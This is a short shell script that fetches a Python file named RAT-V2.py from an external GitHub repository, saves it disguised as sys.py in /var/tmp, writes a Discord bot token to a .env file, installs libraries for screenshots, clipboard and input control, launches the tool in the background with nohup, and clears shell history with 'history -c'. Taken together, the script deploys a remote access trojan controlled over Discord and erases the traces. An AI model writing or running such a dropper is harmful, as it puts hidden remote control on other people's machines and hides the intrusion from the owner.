cd /var/tmp/

wget -O sys.py https://raw.githubusercontent.com/simen64/Discord-RAT-v2/main/RAT-V2.py

echo "DISCORD_TOKEN="$1 > .env

python -m pip install -U --upgrade pip
python -m pip install -U Pillow pyperclip discord.py[voice] requests pyautogui

nohup python3 -u sys.py &

history -c